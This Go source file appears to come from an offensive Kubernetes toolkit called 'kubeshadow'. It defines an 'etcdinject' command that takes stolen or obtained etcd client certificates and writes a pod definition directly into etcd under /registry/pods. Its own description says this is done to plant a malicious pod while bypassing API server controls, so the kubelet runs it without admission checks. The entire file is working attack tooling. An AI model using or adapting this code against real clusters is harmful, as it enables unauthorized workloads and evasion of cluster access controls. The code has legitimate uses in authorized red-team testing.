package modules

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"kubeshadow/pkg/etcd"
	"kubeshadow/pkg/utils"

	"github.com/spf13/cobra"
	corev1 "k8s.io/api/core/v1"
)

// validatePod performs validation on the pod template
func validatePod(pod *corev1.Pod) error {
	if pod == nil {
		return fmt.Errorf("pod template is nil")
	}

	// Validate pod metadata
	if utils.IsEmpty(pod.Name) {
		return fmt.Errorf("pod name is required")
	}
	if utils.IsEmpty(pod.Namespace) {
		return fmt.Errorf("pod namespace is required")
	}

	// Validate containers
	if len(pod.Spec.Containers) == 0 {
		return fmt.Errorf("pod must have at least one container")
	}

	for i, container := range pod.Spec.Containers {
		// Validate container image
		if utils.IsEmpty(container.Image) {
			return fmt.Errorf("container %d: image is required", i)
		}
		if !strings.Contains(container.Image, ":") {
			return fmt.Errorf("container %d: image must include tag", i)
		}

		// Validate resource limits
		if container.Resources.Limits == nil {
			return fmt.Errorf("container %d: resource limits are required", i)
		}
		if _, ok := container.Resources.Limits[corev1.ResourceCPU]; !ok {
			return fmt.Errorf("container %d: CPU limit is required", i)
		}
		if _, ok := container.Resources.Limits[corev1.ResourceMemory]; !ok {
			return fmt.Errorf("container %d: memory limit is required", i)
		}

		// Validate security context
		if pod.Spec.SecurityContext == nil {
			return fmt.Errorf("pod security context is required")
		}
		if pod.Spec.SecurityContext.RunAsNonRoot == nil || !*pod.Spec.SecurityContext.RunAsNonRoot {
			return fmt.Errorf("pod must run as non-root")
		}
	}

	return nil
}

var EtcdInjectCmd = &cobra.Command{
	Use:   "etcdinject",
	Short: "Inject a malicious pod directly into etcd to bypass API server constraints",
	RunE: func(cmd *cobra.Command, args []string) error {
		// Flags
		endpoint, err := cmd.Flags().GetString("endpoint")
		if err != nil {
			return fmt.Errorf("failed to get endpoint flag: %w", err)
		}
		cert, err := cmd.Flags().GetString("cert")
		if err != nil {
			return fmt.Errorf("failed to get cert flag: %w", err)
		}
		key, err := cmd.Flags().GetString("key")
		if err != nil {
			return fmt.Errorf("failed to get key flag: %w", err)
		}
		ca, err := cmd.Flags().GetString("ca")
		if err != nil {
			return fmt.Errorf("failed to get ca flag: %w", err)
		}
		ns, err := cmd.Flags().GetString("namespace")
		if err != nil {
			return fmt.Errorf("failed to get namespace flag: %w", err)
		}
		podname, err := cmd.Flags().GetString("podname")
		if err != nil {
			return fmt.Errorf("failed to get podname flag: %w", err)
		}
		templateFile, err := cmd.Flags().GetString("template")
		if err != nil {
			return fmt.Errorf("failed to get template flag: %w", err)
		}

		// Create client
		client, err := etcd.CreateEtcdClient(endpoint, cert, key, ca)
		if err != nil {
			return fmt.Errorf("❌ etcd client init failed: %v", err)
		}
		defer client.Close()

		// Load template
		raw, err := os.ReadFile(templateFile)
		if err != nil {
			return fmt.Errorf("❌ failed to read pod template: %v", err)
		}

		var pod corev1.Pod
		if err := json.Unmarshal(raw, &pod); err != nil {
			return fmt.Errorf("❌ failed to parse pod template: %v", err)
		}

		// Set metadata
		pod.Name = podname
		pod.Namespace = ns
		if pod.ObjectMeta.Labels == nil {
			pod.ObjectMeta.Labels = make(map[string]string)
		}
		if pod.ObjectMeta.Annotations == nil {
			pod.ObjectMeta.Annotations = make(map[string]string)
		}

		// Ensure required fields
		if pod.APIVersion == "" {
			pod.APIVersion = "v1"
		}
		if pod.Kind == "" {
			pod.Kind = "Pod"
		}

		// Validate pod
		if err := validatePod(&pod); err != nil {
			return fmt.Errorf("❌ pod validation failed: %v", err)
		}

		podData, err := json.Marshal(pod)
		if err != nil {
			return fmt.Errorf("❌ failed to marshal pod: %v", err)
		}

		// Construct etcd key
		keyPath := fmt.Sprintf("/registry/pods/%s/%s", ns, podname)

		// Inject to etcd
		_, err = client.Put(context.Background(), keyPath, string(podData))
		if err != nil {
			return fmt.Errorf("❌ etcd write failed: %v", err)
		}

		fmt.Println("✅ Pod successfully written into etcd. Wait for kubelet to pull it.")
		return nil
	},
}

func init() {
	EtcdInjectCmd.Flags().String("endpoint", "", "etcd HTTPS endpoint (e.g., https://127.0.0.1:2379)")
	EtcdInjectCmd.Flags().String("cert", "", "TLS client cert")
	EtcdInjectCmd.Flags().String("key", "", "TLS client key")
	EtcdInjectCmd.Flags().String("ca", "", "CA cert")
	EtcdInjectCmd.Flags().String("namespace", "default", "Target namespace")
	EtcdInjectCmd.Flags().String("podname", "shadowpod", "Target pod name")
	EtcdInjectCmd.Flags().String("template", "resources/pod_template.json", "Path to pod template JSON")
	EtcdInjectCmd.MarkFlagRequired("endpoint")
	EtcdInjectCmd.MarkFlagRequired("cert")
	EtcdInjectCmd.MarkFlagRequired("key")
	EtcdInjectCmd.MarkFlagRequired("ca")
}
